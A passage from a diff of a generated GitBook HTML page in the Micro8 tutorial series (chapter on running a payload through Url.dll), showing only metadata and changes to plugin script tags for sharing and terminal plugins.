系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/81-90/89_基于白名单Url.dll执行payload第十七季.md","mtime":"2019-03-03T07:44:04.036Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-03T11:03:03.040Z"},"basePath":"../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -2219,7 +2216,7 @@ self<span class="token punctuation">.</span>close
         
     
         
-        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
         
     
         
@@ -2236,6 +2233,10 @@ self<span class="token punctuation">.</span>close
     
         
         <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-terminal/plugin.js"></script>
         
     
         
